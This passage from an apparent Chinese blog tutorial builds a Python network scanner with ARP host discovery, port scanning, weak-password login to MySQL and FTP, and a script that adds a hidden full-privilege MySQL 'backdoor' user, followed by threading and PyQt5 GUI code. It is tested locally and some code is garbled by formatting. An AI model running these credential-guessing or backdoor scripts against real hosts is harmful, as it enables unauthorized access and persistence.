request），目标MAC地址是“FF.FF.FF.FF.FF.FF”，这表示向同一网段内的所有主机发出这样的询问：“192.168.38.11的MAC地址是什么？”</p>\n<p>3.网络上其他主机并不响应ARP询问，只有主机B接收到这个帧时，才向主机A做出这样的回应（ARP response）：“192.168.38.11的MAC地址是00-BB-00-62-C2-02”，此回应以单播方式。这样，主机A就知道主机B的MAC地址，它就可以向主机B发送信息。同时它还更新自己的ARP高速缓存（ARP cache），下次再向主机B发送信息时，直接从ARP缓存表里查找就可。</p>\n</blockquote>\n<h3 id=\"通过arp协议进行主机探活\"><a href=\"#通过arp协议进行主机探活\" class=\"headerlink\" title=\"通过arp协议进行主机探活\"></a>通过arp协议进行主机探活</h3><p>我们通过 scapy 来发送 arp 包，先查看 arp 的包结构</p>\n<pre><code>&gt;&gt;&gt; a = ARP()\n&gt;&gt;&gt; a.display()\n###[ ARP ]### \n  hwtype= 0x1\n  ptype= 0x800\n  hwlen= None\n  plen= None\n  op= who-has\n  hwsrc= 00:0c:29:ee:86:00\n  psrc= 192.168.43.214\n  hwdst= None\n  pdst= None\n\n&gt;&gt;&gt; a.show()\n###[ ARP ]### \n  hwtype= 0x1\n  ptype= 0x800\n  hwlen= None\n  plen= None\n  op= who-has\n  hwsrc= 00:0c:29:ee:86:00\n  psrc= 192.168.43.214\n  hwdst= None\n  pdst= None</code></pre><p>接下来用 python 实现主机探测，并将存活主机 IP 地址存放在 <code>iprange.txt</code> 中</p>\n<p><strong>ArpScanner.py</strong></p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding=utf-8 _*_\n\nfrom scapy.all import *\nimport sys,getopt\n\ndef usage():\n        print &quot;Usage: sudo ./ArpScanner.py &quot;\n\ndef main(argv):\n        try:\n                opts, args = getopt.getopt(argv, &quot;&quot;)\n        except getopt.GetoptError:\n                usage()\n                sys.exit(2)\n        with open(&quot;./iprange.txt&quot;,&quot;w&quot;) as f:\n             for ipFix in range(1,254):\n                     ip = &quot;192.168.43.&quot;+str(ipFix)\n                     arpPkt = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=ip, hwdst=&quot;ff:ff:ff:ff:ff:ff&quot;)\n                     res = srp1(arpPkt, timeout=1, verbose=0)\n                     if res:\n                             f.write(res.psrc+&quot;\\n&quot;)\n                             print &quot;IP: &quot; + res.psrc + &quot;     MAC: &quot; + res.hwsrc\n\nif __name__ == &quot;__main__&quot;:\n        main(sys.argv[1:])</code></pre><h2 id=\"端口探测\"><a href=\"#端口探测\" class=\"headerlink\" title=\"端口探测\"></a>端口探测</h2><p>对于端口探测部分，本项目通过 socket 库实现</p>\n<p><strong>port_scan.py</strong></p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding=utf-8 _*_\nimport socket\n\n#创建流式套接字，连接远程地址\nsk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nsk.settimeout(1)\ntry:\n    sk.connect((&quot;127.0.0.1&quot;,3306))\n    print &apos;service ok&apos;\nexcept Exception:\n    print &apos;service bad&apos;\n\nsk.close()</code></pre><p>通过简单的远程连接结果来判断目标端口是否开放</p>\n<h2 id=\"尝试弱口令登陆特定服务\"><a href=\"#尝试弱口令登陆特定服务\" class=\"headerlink\" title=\"尝试弱口令登陆特定服务\"></a>尝试弱口令登陆特定服务</h2><h3 id=\"连接-mysql\"><a href=\"#连接-mysql\" class=\"headerlink\" title=\"连接 mysql\"></a>连接 mysql</h3><p>在本项目中我使用 pymysql 库来对 mysql 进行操作。 对于开放 mysql 服务的主机先尝试弱口令连接，以下是我在本地开放 mysql 服务后的测试：</p>\n<p><strong>conn_mysql.py</strong></p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding=utf-8 _*_\nimport socket\nimport pymysql\n\n# information_schema 是 Mysql 的默认数据库，我们有权限操作\n# pymysql.cursors.DictCursor 以字典方式进行连接参数管理\ntry:\n    connection = pymysql.connect(host=&apos;127.0.0.1&apos;,\n                                 user=&apos;root&apos;,\n                                 password=&apos;root&apos;,\n                                 db=&apos;information_schema&apos;,\n                                 charset=&apos;utf8mb4&apos;,\n                                cursorclass=pymysql.cursors.DictCursor)\n    # cursor()得到一个光标对象，等待输入sql语句\n    with connection.cursor() as cursor:\n        # 创建一个新记录\n        sql = &quot;select version()&quot;\n        cursor.execute(sql)\n        result = cursor.fetchone()\n    print(result)\n    connection.close()\nexcept Exception as e:\n    print &quot;登陆失败！&quot;</code></pre><p>结果成功打印了 mysql 的版本号 <code>{u&#39;version()&#39;: u&#39;5.5.53&#39;}</code> ！在我们进行数据库连接时参数都正确就登陆成功，如果错了，就会被捕捉到。</p>\n<h3 id=\"添加后门用户\"><a href=\"#添加后门用户\" class=\"headerlink\" title=\"添加后门用户\"></a>添加后门用户</h3><p>首先在本地测试查询用户命令：</p>\n<pre><code>mysql&gt; select user,host from mysql.user;\n+------+-----------+\n| user | host      |\n+------+-----------+\n| root | 127.0.0.1 |\n| root | ::1       |\n| root | localhost |</code></pre><p>创建新用户：</p>\n<pre><code>create user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;</code></pre><p>刷新权限：</p>\n<pre><code>flush privileges;</code></pre><p>尝试远程登陆：</p>\n<pre><code>mysql -u root -p -h 192.168.43.61</code></pre><p>登陆成功。但是我们没有权限访问默认数据库  <code>information_schema</code> ,还需要在创建用户时更改权限</p>\n<pre><code>mysql&gt; grant all privileges on *.* to &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;\nQuery OK, 0 rows affected (0.17 sec)</code></pre><p>刷新系统权限表</p>\n<pre><code>mysql&gt; flush privileges;\nQuery OK, 0 rows affected (0.13 sec)</code></pre><p>在本地测试完我们还要删除测试账号</p>\n<pre><code>mysql&gt; delete from user where user=&apos;admmin&apos; and host=&apos;%&apos;;\nQuery OK, 0 rows affected (0.42 sec)\n\nmysql&gt; flush privileges;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; drop user &apos;admin&apos;@&apos;%&apos;;\nQuery OK, 0 rows affected (0.10 sec)\n\nmysql&gt; select user,host from user;\n+------+-----------+\n| user | host      |\n+------+-----------+\n| root | 127.0.0.1 |\n| root | ::1       |\n| root | localhost |\n+------+-----------+\n3 rows in set (0.00 sec)</code></pre><p>接下来尝试使用 <code>python</code> 完成上面的操作：</p>\n<p><strong>set_backdoor.py</strong></p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding=utf-8 _*_\n\nimport pymysql\n\nconnection = pymysql.connect(host=&apos;127.0.0.1&apos;,\n                                 user=&apos;root&apos;,\n                                 password=&apos;root&apos;,\n                                 db=&apos;information_schema&apos;,\n                                 charset=&apos;utf8mb4&apos;,\n                                 cursorclass=pymysql.cursors.DictCursor)\n\ntry:\n    with connection.cursor() as cursor:\n        # 创建一个新用户\n        sql = &quot;CREATE user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;&quot;\n        cursor.execute(sql)\n        # 将后门用户权限给到最大\n        cursor.execute(&quot;grant all privileges on *.* to &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;&quot;)\n        cursor.execute(&quot;flush privileges&quot;)\n        # 需要手动提交\n        connection.commit()\n        connection.close()\n        print &quot;创建成功！&quot;\nexcept Exception as e:\n    print e</code></pre><h3 id=\"弱口令登陆-FTP\"><a href=\"#弱口令登陆-FTP\" class=\"headerlink\" title=\"弱口令登陆 FTP\"></a>弱口令登陆 FTP</h3><p>先在本地搭建 ftp 服务进行测试。 </p>\n<p>本项目 <code>ftp</code> 模块使用 <code>ftplib</code> 实现</p>\n<p>将弱口令账户密码保存在 <code>ftp_dict.txt</code> 中，用 <code>|</code> 做分割，考虑到可以匿名访问的问题，将空账号密码也作为测试内容加入字典中，如果扫描结果输出 <code>user</code> 和 <code>pwd</code>为空，则代表该 ftp 服务允许匿名访问</p>\n<pre><code>admin|admin\nadmin|root\n |\nroot|root</code></pre><p><strong>FTP_login.py</strong></p>\n<pre><code>def try_login_ftp(ip,save_path):\n    avleable_list = &quot;&quot;\n    # 如果输出 user 和 pwd 为空则说明该 ftp 服务允许匿名访问\n    try:\n        ftp = FTP()\n        ftp.connect(ip)\n        with open(&quot;ftp_dict.txt&quot;, &apos;r&apos;) as f:\n            for line in f.readlines():\n                #print line.strip()\n                user = line.strip().split(&quot;|&quot;)[0]\n                pwd = line.strip().split(&quot;|&quot;)[1]\n                ftp.login(user, pwd)  # 允许匿名访问\n                # 访问成功\n                print &quot;[+] ftp service is ok！username= &quot; + user + &quot;pwd = &quot; + pwd + &quot;\\r\\n&quot;\n                avleable_list = str(time.asctime()) + &quot; &quot; + ip + &quot; : &quot; + user + &quot; | &quot; + pwd + &quot;\\r\\n&quot;\n                save_result(save_path, avleable_list)\n                print &quot;[+] 该 ftp 文件目录为：&quot;\n                ftp.dir()\n                break\n    except Exception as e:\n        print e\n        print &quot;[-] ftp service is bad!&quot;\n        pass\n    return\n\ndef save_result(save_path,result_list):\n    s = open(save_path, &quot;a&quot;)\n    s.write(result_list)\n    s.close()\n    return</code></pre><p>这里需要注意的是 ftp 服务是否开放不能像 mysql 服务探测一样依据端口情况判断，而要根据 <code>ftp.connect()</code> 的结果判断。</p>\n<p><strong>误</strong>：上边的说法不对，其实还是可以判断的</p>\n<pre><code>try:\n    res1 = sk1.connect_ex((ip, 21))\n    print res1\n    if res1 == 0:\n        print &apos;[+] ftp service is ok! try to login...\\r\\n&apos;\n        ftp_service.try_login_ftp(url2, save_path)\n    else:\n        print res1\nexcept Exception, e:\n    print &apos;[-] ftp service login failed!&apos; + str(e) + &apos;\\r\\n&apos;\nsk1.close()</code></pre><p>通过 <code>connect.ex()</code> 返回的状态码来判断是否开放即可。</p>\n<h2 id=\"python-多线程\"><a href=\"#python-多线程\" class=\"headerlink\" title=\"python 多线程\"></a>python 多线程</h2><p>python 中使用多线程有两种方式： 函数或者用类来包装线程对象</p>\n<p>python使用 threading 模块来提供线程支持：</p>\n<ul>\n<li>threading.currentThread(): 返回当前的线程变量。</li>\n<li>threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。</li>\n<li>threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。</li>\n<li>run(): 用以表示线程活动的方法。</li>\n<li>start():启动线程活动。</li>\n<li>join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。</li>\n<li>isAlive(): 返回线程是否活动的。</li>\n<li>getName(): 返回线程名</li>\n<li>setName(): 设置线程名。</li>\n</ul>\n<h3 id=\"使用多线程的简单实例\"><a href=\"#使用多线程的简单实例\" class=\"headerlink\" title=\"使用多线程的简单实例\"></a>使用多线程的简单实例</h3><pre><code># -*-* encoding:UTF-8 -*-\n# author : 刘宇航\n# date   : 2019/12/11\n\nimport Queue\nimport threading\nimport time\n\nexitFlag = 0\n\nclass myThread (threading.Thread):\n    def __init__(self, threadID, name, counter):\n        threading.Thread.__init__(self)\n        self.threadID = threadID\n        self.name = name\n        self.counter = counter\n    def run(self):\n        print &quot;Starting &quot; + self.name\n        process_data(self.name,self.counter,5)\n        print &quot;Exit &quot; + self.name</code></pre><p>​<br>    def process_data(threadName, delay, counter):<br>        while counter:<br>            if exitFlag:<br>                (threading.Thread).exit()<br>            time.sleep(delay)<br>            print “%s: %s” % (threadName,time.ctime(time.time()))<br>            counter -= 1</p>\n<pre><code>#创建线程\nthread1 = myThread(1,&quot;Thread-1&quot;,1)\nthread2 = myThread(2,&quot;Thread-2&quot;,2)\n\n#开启线程\nthread1.start()\nthread2.start()\n\nprint &quot;Exiting Main Thread&quot;</code></pre><h3 id=\"线程同步\"><a href=\"#线程同步\" class=\"headerlink\" title=\"线程同步\"></a>线程同步</h3><p>引入 锁 的概念：每当一个线程比如 线程1 要访问共享数据时，必须先获得锁定；如果已经有别的线程比如 线程2 获得锁定了，那么就让线程1暂停，也就是同步阻塞；等到线程2访问完毕，释放锁以后，再让线程1继续。</p>\n<p>使用<code>Thread</code>对象的<code>Lock</code>和<code>Rlock</code>可以实现简单的线程同步，这两个对象都有<code>acquire</code>方法和<code>release</code>方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到<code>acquire</code>和<code>release</code>方法之间.</p>\n<p><strong>threads_test.py</strong></p>\n<pre><code># -*-* encoding:UTF-8 -*-\n# author : 刘宇航\n# date   : 2019/12/11\n\nimport Queue\nimport threading\nimport time\n\nclass myThread (threading.Thread):\n    def __init__(self, threadID, name, counter):\n        threading.Thread.__init__(self)\n        self.threadID = threadID\n        self.name = name\n        self.counter = counter\n    def run(self):\n        print &quot;Starting &quot; + self.name\n        # 获得锁，成功后返回 True\n        # 可选的 timeout 参数不填时将会一直阻塞直到获得锁定\n        # 否则超时会返回false\n        threadLock.acquire()\n        process_data(self.name,self.counter,3)\n        # 释放锁\n        threadLock.release()\n        print &quot;Exit &quot; + self.name</code></pre><p>​<br>    def process_data(threadName, delay, counter):<br>        while counter:<br>            time.sleep(delay)<br>            print “%s: %s” % (threadName,time.ctime(time.time()))<br>            counter -= 1</p>\n<pre><code>threadLock = threading.Lock()\nthreads = []\n\n#创建线程\nthread1 = myThread(1,&quot;Thread-1&quot;,1)\nthread2 = myThread(2,&quot;Thread-2&quot;,2)\n\n#开启线程\nthread1.start()\nthread2.start()\n\n# 添加线程到线程列表\nthreads.append(thread1)\nthreads.append(thread2)\n\nfor t in threads:\n    t.join()\nprint &quot;Exiting Main Thread&quot;</code></pre><p>结果：</p>\n<pre><code>Starting Thread-1\nStarting Thread-2\nThread-1: Wed Dec 11 14:24:40 2019\nThread-1: Wed Dec 11 14:24:41 2019\nThread-1: Wed Dec 11 14:24:42 2019\nExit Thread-1\nThread-2: Wed Dec 11 14:24:44 2019\nThread-2: Wed Dec 11 14:24:46 2019\nThread-2: Wed Dec 11 14:24:48 2019\nExit Thread-2\nExiting Main Thread</code></pre><h3 id=\"线程池\"><a href=\"#线程池\" class=\"headerlink\" title=\"线程池\"></a>线程池</h3><p>使用线程池无疑是一个实现20线程数的好方法。</p>\n<p>需要注意的是使用 <code>poo.map()</code> 传递的是两个参数第一个参数是一个函数名（不带()），第二个参数是个迭代对象。</p>\n<p>一般情况第二个参数，传入一个迭代就够用了</p>\n<p><strong>threading_pool.py</strong></p>\n<pre><code>#!/usr/bin/env python\n# -*- coding=utf-8 -*-\n\nimport socket\nfrom datetime import datetime\nfrom multiprocessing.dummy import Pool as ThreadPool\n\n\nremote_server = raw_input(&quot;Enter a remote host to scan:&quot;)\nremote_server_ip = socket.gethostbyname(remote_server)\nports = []\n\nprint &apos;-&apos; * 60\nprint &apos;Please wait, scanning remote host &apos;, remote_server_ip\nprint &apos;-&apos; * 60\n\nsocket.setdefaulttimeout(0.5)</code></pre><p>​<br>    def scan_port(port):<br>        try:<br>            s = socket.socket(2, 1)<br>            res = s.connect_ex((remote_server_ip, port))<br>            if res == 0:  # 如果端口开启 发送 hello 获取banner<br>                print ‘Port {}: OPEN’.format(port)<br>            s.close()<br>        except Exception, e:<br>            print str(e.message)</p>\n<pre><code>for i in range(1, 1025):\n    ports.append(i)\n\n# Check what time the scan started</code></pre><p>​<br>    t1 = datetime.now()</p>\n<pre><code>pool = ThreadPool(processes=20)\ntry:\n    results = pool.map(scan_port,ports)\nexcept Exception as e:\n    print e\npool.close()\npool.join()\n\nprint &apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1</code></pre><p>扫描速度还是很快的</p>\n<pre><code>Enter a remote host to scan:192.168.43.61\n------------------------------------------------------------\nPlease wait, scanning remote host  192.168.43.61\n------------------------------------------------------------\nPort 80: OPEN\nPort 135: OPEN\nPort 110: OPEN\nPort 139: OPEN\nPort 21: OPEN\nPort 25: OPEN\nPort 443: OPEN\nPort 445: OPEN\nPort 912: OPEN\nPort 902: OPEN\nMultiprocess Scanning Completed in   0:00:26.119000</code></pre><p>稍微改改放到我们的主程序中试一下扫描速度</p>\n<p>不加多线程：</p>\n<pre><code>0:00:07.019000</code></pre><p>加完之后：</p>\n<pre><code>Multiprocess Scanning Completed in   0:00:02.029000</code></pre><p>速度提升了不少！ <code>7s -&gt; 2s</code> </p>\n<h2 id=\"图形化编程\"><a href=\"#图形化编程\" class=\"headerlink\" title=\"图形化编程\"></a>图形化编程</h2><p>为了使用更方便的 PyQt5 ，把代码全都换成 python3.8 嗷。</p>\n<h3 id=\"PyQt5-入门\"><a href=\"#PyQt5-入门\" class=\"headerlink\" title=\"PyQt5-入门\"></a>PyQt5-入门</h3><p>展示一个小窗口：</p>\n<pre><code>import sys\nfrom PyQt5.QtWidgets import QApplication, QWidget\n\nif __name__ == &apos;__main__&apos;:\n\n    app = QApplication(sys.argv)\n\n    w = QWidget()\n    w.resize(250,250)\n    w.move(300, 300)\n    w.setWindowTitle(&apos;Simple&apos;)\n\n    w.show()\n\n    sys.exit(app.exec_())</code></pre><p>所有的PyQt5应用必须创建一个应用（<code>Application</code>）对象。<code>Qwidget</code> 组件是 <code>PyQt5</code> 中所有用户界面类的基础类。我们给 <code>QWidget</code> 提供了默认的构造方法。默认构造方法没有父类。没有父类的 <code>widget</code> 组件将被作为窗口使用。</p>\n<p><code>show()</code> 方法在屏幕上显示出 <code>widget</code> 。一个 <code>widget</code> 对象在这里第一次被在内存中创建，并且之后在屏幕上显示。</p>\n<p>最后，应用进入主循环。在这个地方，事件处理开始执行。主循环用于接收来自窗口触发的事件，并且转发他们到<code>widget</code> 应用上处理。如果我们调用 <code>exit()</code> 方法或主 <code>widget</code> 组件被销毁，主循环将退出。<code>sys.exit()</code>方法确保一个不留垃圾的退出。系统环境将会被通知应用是怎样被结束的。</p>\n<p><code>exec_()</code> 方法有一个下划线。因为 <code>exec</code> 是Python保留关键字。因此，用 <code>exec_()</code> 来代替。</p>\n<h3 id=\"PyQt5-信号槽机制\"><a href=\"#PyQt5-信号槽机制\" class=\"headerlink\" title=\"PyQt5-信号槽机制\"></a>PyQt5-信号槽机制</h3><p>在PyQt5中，事件处理系统由信号&amp;槽机制建立。如果我们点击了按钮，信号 <code>clicked</code> 被发送。槽可以是Qt内置的槽或Python 的一个方法调用。 <code>QCoreApplication</code> 类包含了主事件循环；它处理和转发所有事件。<code>instance()</code> 方法给我们返回一个实例化对象。注意 <code>QCoreAppli</code> 类由 <code>QApplication</code> 创建。点击信号连接到 <code>quit()</code> 方法，将结束应用。事件通信在两个对象之间进行：发送者和接受者。发送者是按钮，接受者是应用对象。</p>\n<pre><code>#!/usr/bin/python3\n# -*- coding: utf-8 -*-\n\nimport sys\nfrom PyQt5.QtWidgets import (QApplication, QWidget,\n    QPushButton, QToolTip)\nfrom PyQt5.QtGui import QFont,QIcon\nfrom PyQt5.QtCore import QCoreApplication</code></pre><p>​<br>    class Example(QWidget):</p>\n<pre><code>def __init__(self):\n    super().__init__()\n\n    self.initUI()</code></pre><p>​<br>        def initUI(self):</p>\n<pre><code>QToolTip.setFont(QFont(&apos;SanSerif&apos;,10))\n\nself.setToolTip(&apos;This is a &lt;b&gt;QWidget&lt;/b&gt; widget&apos;)\n\nbtn = QPushButton(&apos;Quit&apos;, self)\nbtn.clicked.connect(QCoreApplication.instance().quit)\nbtn.setToolTip(&apos;This is a &lt;b&gt;QPushButton&lt;/b&gt; widget&apos;)\nbtn.resize(btn.sizeHint())\nbtn.move(50,50)\n\nself.setGeometry(300,300,300,220)\nself.setWindowTitle(&apos;Icon&apos;)\nself.setWindowIcon(QIcon(&quot;C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico&quot;))\n\nself.show()</code></pre><p>​<br>​<br>    if <strong>name</strong> == ‘<strong>main</strong>‘:</p>\n<pre><code>app = QApplication(sys.argv)\n\nex = Example()\nsys.exit(app.exec_())</code></pre><h3 id=\"菜单栏、状态栏\"><a href=\"#菜单栏、状态栏\" class=\"headerlink\" title=\"菜单栏、状态栏\"></a>菜单栏、状态栏</h3><pre><code>#!/usr/bin/python3\n# -*- coding: utf-8 -*-\n\nimport sys\nfrom PyQt5.QtWidgets import (QApplication, QWidget,\n    QPushButton, QToolTip, QDesktopWidget,\n                             QMainWindow, QMessageBox,\n                             QAction, qApp,\n                             QTextEdit)\nfrom PyQt5.QtGui import QFont,QIcon</code></pre><p>​<br>​<br>    class Example(QMainWindow):</p>\n<pre><code>def __init__(self):\n    super().__init__()\n\n    self.initUI()\n\ndef initUI(self):\n\n    textEdit = QTextEdit()\n    self.setCentralWidget(textEdit)</code></pre><p>​<br>            exitAction = QAction(QIcon(“C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico”)<br>                                 , ‘&amp;Exit’, self)<br>            exitAction.setShortcut(‘Ctrl+Q’)<br>            exitAction.setStatusTip(‘Exit application’)<br>            exitAction.triggered.connect(self.close)</p>\n<pre><code>self.statusBar()\n\nmenubar = self.menuBar()\nfileMenu = menubar.addMenu(&apos;&amp;File&apos;)\nfileMenu.addAction(exitAction)\n\ntoolbar = self.addToolBar(&apos;Exit&apos;)\ntoolbar.addAction(exitAction)</code></pre><p>​<br>​<br>            self.setGeometry(300,300,500, 350)<br>            self.setWindowTitle(‘Message box’)<br>            self.show()</p>\n<pre><code>def center(self):\n\n    qr = self.frameGeometry()\n    cp = QDesktopWidget().availableGeometry().center()\n    qr.moveCenter(cp)\n    self.move(qr.topLeft())</code></pre><p>​<br>​<br>        def closeEvent(self, event):</p>\n<pre><code>reply = QMessageBox.question(self, &apos;Message&apos;,\n                             &quot;Are you sure to quit?&quot;,QMessageBox.Yes |\n                             QMessageBox.No, QMessageBox.No)\n\nif reply == QMessageBox.Yes:\n    event.accept()\n\nelse:\n    event.ignore()</code></pre><p>​<br>    if <strong>name</strong> == ‘<strong>main</strong>‘:</p>\n<pre><code>app = QApplication(sys.argv)\n\nex = Example()\nsys.exit(app.exec_())</code></pre><p>接下来让我们分开看</p>\n<pre><code>self.statusBar().showMessage(&apos;Ready&apos;)</code></pre><p>为了得到状态栏，我们调用了 <code>QtGui.QMainWindow</code> 类的 <code>statusBar()</code> 方法。第一次调用这个方法创建了一个状态栏。随后方法返回状态栏对象。然后用 <code>showMessage()</code> 方法在状态栏上显示一些信息。</p>\n<pre><code>menubar = self.menuBar()\nfileMenu = menubar.addMenu(&apos;&amp;File&apos;)\nfileMenu.addAction(exitAction)</code></pre><p><code>QAction</code> 是一个用于菜单栏、工具栏或自定义快捷键的抽象动作行为。在上面的三行中，我们创建了一个有指定图标和文本为 <code>&#39;Exit&#39;</code> 的标签。另外，还为这个动作定义了一个快捷键。第三行创建一个当我们鼠标浮于菜单项之上就会显示的一个状态提示。当我们选中特定的动作，一个触发信号会被发射。信号连接到 <code>QApplication</code> 组件的<code>quit()</code> 方法。这样就中断了应用。</p>\n<pre><code>exitAction = QAction(QIcon(&quot;C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico&quot;)\n                                 , &apos;&amp;Exit&apos;, self)\n            exitAction.setShortcut(&apos;Ctrl+Q&apos;)\n            exitAction.setStatusTip(&apos;Exit application&apos;)\n            exitAction.triggered.connect(self.close)</code></pre><p>我们创建了一个动作对象，和之前菜单栏中的部分代码相似。这个动作有一个标签，图标和快捷键。并且将<code>QtGui.QMainWindow的quit()</code> 方法连接到了触发信号上。创建了一个工具栏，并且在其中插入一个动作对象。</p>\n<h3 id=\"事件和信号\"><a href=\"#事件和信号\" class=\"headerlink\" title=\"事件和信号\"></a>事件和信号</h3><p>所有的GUI应用都是由事件驱动的。事件主要有用户操作产生，但是事件可能由其他条件触发，比如一个网络连接。当我们调用应用的 exec_() 方法时，应用进入了主循环，主循环用于检测事件的产生并且将事件送到用于处理的对象中去。</p>\n<p>事件模型有三个参与者：</p>\n<ul>\n<li>事件源</li>\n<li>事件对象</li>\n<li>事件目标</li>\n</ul>\n<p>事件源是状态发生改变的对象。它产生了事件。事件对象(evnet)封装了事件源中的状态变化。事件目标是想要被通知的对象。事件源对象代表了处理一个事件直到事件目标做出响应的任务。</p>\n<p>PyQt5有一个独一无二的信号和槽机制来处理事件。信号和槽用于对象之间的通信。当指定事件发生，一个事件信号会被发射。槽可以被任何Python脚本调用。当和槽连接的信号被发射时，槽会被调用。</p>\n<p>由于 Qt desinger 的设计与逻辑分离会给我们很大的帮助，所以我们使用 Qt desinger 来设计一个模板</p>\n<p><strong>sample_scan_1.py</strong></p>\n<pre><code>from PyQt5 import QtCore, QtGui, QtWidgets</code></pre><p>​<br>    class Ui_Form(object):<br>        def setupUi(self, Form):<br>            Form.setObjectName(“Form”)<br>            Form.resize(439, 345)<br>            self.verticalLayoutWidget = QtWidgets.QWidget(Form)<br>            self.verticalLayoutWidget.setGeometry(QtCore.QRect(10, 50, 131, 80))<br>            self.verticalLayoutWidget.setObjectName(“verticalLayoutWidget”)<br>            self.verticalLayout = QtWidgets.QVBoxLayout(self.verticalLayoutWidget)<br>            self.verticalLayout.setContentsMargins(0, 0, 0, 0)<br>            self.verticalLayout.setObjectName(“verticalLayout”)<br>            self.ftp_label = QtWidgets.QLabel(self.verticalLayoutWidget)<br>            self.ftp_label.setObjectName(“ftp_label”)<br>            self.verticalLayout.addWidget(self.ftp_label)<br>            self.mysql_label = QtWidgets.QLabel(self.verticalLayoutWidget)<br>            self.mysql_label.setObjectName(“mysql_label”)<br>            self.verticalLayout.addWidget(self.mysql_label)<br>            self.verticalLayoutWidget_2 = QtWidgets.QWidget(Form)<br>            self.verticalLayoutWidget_2.setGeometry(QtCore.QRect(160, 50, 160, 80))<br>            self.verticalLayoutWidget_2.setObjectName(“verticalLayoutWidget_2”)<br>            self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.verticalLayoutWidget_2)<br>            self.verticalLayout_2.setContentsMargins(0, 0, 0, 0)<br>            self.verticalLayout_2.setObjectName(“verticalLayout_2”)<br>            self.ftp_scan = QtWidgets.QPushButton(self.verticalLayoutWidget_2)<br>            self.ftp_scan.setObjectName(“ftp_scan”)<br>            self.verticalLayout_2.addWidget(self.ftp_scan)<br>            self.mysql_scan = QtWidgets.QPushButton(self.verticalLayoutWidget_2)<br>            self.mysql_scan.setObjectName(“mysql_scan”)<br>            self.verticalLayout_2.addWidget(self.mysql_scan)<br>            self.textBrowser = QtWidgets.QTextBrowser(Form)<br>            self.textBrowser.setGeometry(QtCore.QRect(40, 140, 256, 192))<br>            self.textBrowser.setObjectName(“textBrowser”)</p>\n<pre><code>        self.retranslateUi(Form)\n        QtCore.QMetaObject.connectSlotsByName(Form)\n\n    def retranslateUi(self, Form):\n        _translate = QtCore.QCoreApplication.translate\n        Form.setWindowTitle(_translate(&quot;Form&quot;, &quot;Form&quot;))\n        self.ftp_label.setText(_translate(&quot;Form&quot;, &quot;FTP server&quot;))\n        self.mysql_label.setText(_translate(&quot;Form&quot;, &quot;MySQL server&quot;))\n        self.ftp_scan.setText(_translate(&quot;Form&quot;, &quot;开始扫描&quot;))\n        self.mysql_scan.setText(_translate(&quot;Form&quot;, &quot;开始扫描&quot;))\n        self.textBrowser.setHtml(_translate(&quot;Form&quot;, &quot;&lt;!DOCTYPE HTML PUBLIC \\&quot;-//W3C//DTD HTML 4.0//EN\\&quot; \\&quot;http://www.w3.org/TR/REC-html40/strict.dtd\\&quot;&gt;\\n&quot;\n&quot;&lt;html&gt;&lt;head&gt;&lt;meta name=\\&quot;qrichtext\\&quot; content=\\&quot;1\\&quot; /&gt;&lt;style type=\\&quot;text/css\\&quot;&gt;\\n&quot;\n&quot;p, li { white-space: pre-wrap; }\\n&quot;\n&quot;&lt;/style&gt;&lt;/head&gt;&lt;body style=\\&quot; font-family:\\&apos;SimSun\\&apos;; font-size:9pt; font-weight:400; font-style:normal;\\&quot;&gt;\\n&quot;\n&quot;&lt;p style=\\&quot; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\\&quot;&gt;&lt;span style=\\&quot; font-family:\\&apos;SimSun\\&apos;;\\&quot;&gt;扫描结果如下：&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;))</code></pre><p>然后我们只需写一个调用这个组件的代码就行：</p>\n<p><strong>call_scan1.py</strong></p>\n<pre><code>import sys\nimport time\nfrom PyQt5.QtWidgets import QApplication, QMainWindow\nfrom PyQt5.QtCore import QObject, pyqtSignal\n\nfrom sample_scan_1 import Ui_Form\nfrom FtpModule import Ftp\nfrom MySQLModule import MySQL</code></pre><p>​<br>    class MainWindow(QMainWindow, Ui_Form):<br>        def <strong>init</strong>(self, parent=None):<br>            super(MainWindow, self).<strong>init</strong>(parent)<br>            self.setupUi(self)<br>            self.ftp_scan.clicked.connect(lambda: self.ftp())<br>            self.mysql_scan.clicked.connect(lambda: self.mysql())<br>            self.update_text()</p>\n<pre><code>    def ftp(self):\n        ftp = Ftp()\n        ftp.threadpool()\n\n    def mysql(self):\n        mysql = MySQL()\n        mysql.threadpool()\n\n    def update_text(self):\n\n        with open(&quot;./result.txt&quot;) as f:\n            line = f.readlines()\n            self.textBrowser.append(line[-1])\n\nif __name__ == &quot;__main__&quot;:\n    # 固定的，PyQt5程序都需要QApplication对象。sys.argv是命令行参数列表，确保程序可以双击运行\n    app = QApplication(sys.argv)\n    # 初始化\n    myWin = MainWindow()\n    # 将窗口控件显示在屏幕上\n    myWin.show()\n    # 程序运行，sys.exit方法确保程序完整退出。\n    sys.exit(app.exec_())</code></pre><h2 id=\"模块化\"><a href=\"#模块化\" class=\"headerlink\" title=\"模块化\"></a>模块化</h2><p>为了更好的与 PyQt5 配合，将代码各个功能规划到不同的类，根据需求调用</p>\n<p><strong>FtpModule.py</strong></p>\n<pre><code>import time\nimport 